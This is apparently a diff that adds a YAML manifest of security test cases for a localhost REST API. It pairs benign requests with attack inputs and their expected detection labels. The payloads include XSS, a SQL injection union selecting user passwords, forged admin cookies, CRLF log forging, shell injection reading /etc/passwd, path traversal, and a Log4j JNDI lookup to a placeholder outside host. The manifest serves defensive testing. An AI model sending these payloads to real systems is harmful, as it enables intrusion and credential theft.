@@ -1,0 +1,165 @@
+version: "1.0"
+experiment_id: "EXP-2026-FINAL"
+experiment_name: "Controlled Live REST API Security Verification Manifest"
+target_base_url: "http://127.0.0.1:8080"
+
+test_cases:
+  - test_case_id: "NORMAL_001"
+    category: "BENIGN"
+    method: "GET"
+    endpoint: "/api/books"
+    required_authentication: true
+    user: "user01"
+    headers:
+      Accept: "application/json"
+    safe_test_data: {}
+    description: "Standard legitimate book catalog fetch by authenticated user"
+    expected_ground_truth: "BENIGN"
+    expected_safe_mitigation: "ALLOW"
+
+  - test_case_id: "NORMAL_002"
+    category: "BENIGN"
+    method: "GET"
+    endpoint: "/api/books/101"
+    required_authentication: true
+    user: "user01"
+    headers:
+      Accept: "application/json"
+    safe_test_data: {}
+    description: "Authenticated user accesses their legitimately owned resource"
+    expected_ground_truth: "BENIGN"
+    expected_safe_mitigation: "ALLOW"
+
+  - test_case_id: "NORMAL_003"
+    category: "BENIGN"
+    method: "GET"
+    endpoint: "/api/books?category=Technology"
+    required_authentication: true
+    user: "user02"
+    headers:
+      Accept: "application/json"
+    safe_test_data: {}
+    description: "Standard category query filtering"
+    expected_ground_truth: "BENIGN"
+    expected_safe_mitigation: "ALLOW"
+
+  - test_case_id: "BOLA_001"
+    category: "BOLA"
+    method: "PUT"
+    endpoint: "/api/books/201"
+    required_authentication: true
+    user: "user01"
+    headers:
+      Content-Type: "application/json"
+    safe_test_data:
+      title: "Cross-User Unauthorized Edit Attempt"
+    description: "user01 attempts unauthorized modification of book 201 belonging to user02"
+    expected_ground_truth: "BOLA"
+    expected_safe_mitigation: "BLOCK + authorization"
+
+  - test_case_id: "BOLA_002"
+    category: "BOLA"
+    method: "DELETE"
+    endpoint: "/api/books/301"
+    required_authentication: true
+    user: "user01"
+    headers:
+      Accept: "application/json"
+    safe_test_data: {}
+    description: "user01 attempts unauthorized deletion of book 301 belonging to user03"
+    expected_ground_truth: "BOLA"
+    expected_safe_mitigation: "BLOCK + authorization"
+
+  - test_case_id: "XSS_001"
+    category: "XSS"
+    method: "POST"
+    endpoint: "/api/comments/book/101"
+    required_authentication: true
+    user: "user01"
+    headers:
+      Content-Type: "application/json"
+    safe_test_data:
+      text: "<script>alert('research_xss')</script><img src=x onerror=alert(1)>"
+    description: "Harmless script injection string submitted in comment body"
+    expected_ground_truth: "XSS"
+    expected_safe_mitigation: "BLOCK / ALERT + safe rendering"
+
+  - test_case_id: "SQLI_001"
+    category: "SQL_INJECTION"
+    method: "GET"
+    endpoint: "/api/books?search=%27%20OR%20%271%27=%271%20--%20UNION%20SELECT%20username,password%20FROM%20users"
+    required_authentication: false
+    user: "anonymous"
+    headers:
+      Accept: "application/json"
+    safe_test_data: {}
+    description: "Tautological SQL syntax query injected into search parameter"
+    expected_ground_truth: "SQL Injection"
+    expected_safe_mitigation: "BLOCK + parameterized query path"
+
+  - test_case_id: "COOKIE_001"
+    category: "COOKIE_INJECTION"
+    method: "GET"
+    endpoint: "/api/books"
+    required_authentication: false
+    user: "anonymous"
+    headers:
+      Cookie: "session_override=admin_bypass; role=superadmin; user_id=1"
+    safe_test_data: {}
+    description: "Controlled malformed authorization cookie injected to test session validation"
+    expected_ground_truth: "Cookie Injection"
+    expected_safe_mitigation: "BLOCK + session validation"
+
+  - test_case_id: "LOGFORGE_001"
+    category: "LOG_FORGING"
+    method: "POST"
+    endpoint: "/api/comments/book/101"
+    required_authentication: true
+    user: "user01"
+    headers:
+      Content-Type: "application/json"
+    safe_test_data:
+      text: "Normal Comment\r\n[2026-10-08 17:30:00] [AUDIT] Security verification disabled by root"
+    description: "CRLF control character injection attempting to fabricate raw log entries"
+    expected_ground_truth: "Log Forging"
+    expected_safe_mitigation: "BLOCK / ALERT + structured logging"
+
+  - test_case_id: "RCE_001"
+    category: "RCE"
+    method: "GET"
+    endpoint: "/api/books?search=;%20cat%20/etc/passwd%20|%20sh%20;%20echo%20pwned"
+    required_authentication: false
+    user: "anonymous"
+    headers:
+      Accept: "application/json"
+    safe_test_data: {}
+    description: "Harmless shell syntax injection string (Execution: NOT PERFORMED)"
+    expected_ground_truth: "RCE"
+    expected_safe_mitigation: "BLOCK (Execution: NOT PERFORMED)"
+
+  - test_case_id: "TRAVERSAL_001"
+    category: "DIRECTORY_TRAVERSAL"
+    method: "GET"
+    endpoint: "/api/books/..%2F..%2F..%2Fetc%2Fpasswd"
+    required_authentication: false
+    user: "anonymous"
+    headers:
+      Accept: "application/json"
+    safe_test_data: {}
+    description: "Virtual path traversal sequence attempting sensitive OS file discovery"
+    expected_ground_truth: "Directory Traversal"
+    expected_safe_mitigation: "BLOCK + path validation"
+
+  - test_case_id: "LOG4J_001"
+    category: "LOG4J"
+    method: "POST"
+    endpoint: "/api/comments/book/101"
+    required_authentication: true
+    user: "user01"
+    headers:
+      Content-Type: "application/json"
+    safe_test_data:
+      text: "${jndi:ldap://test-research-domain.invalid:1389/Exploit}"
+    description: "Controlled JNDI pattern string without triggering remote execution"
+    expected_ground_truth: "LOG4J"
+    expected_safe_mitigation: "BLOCK / ALERT + safe logging"
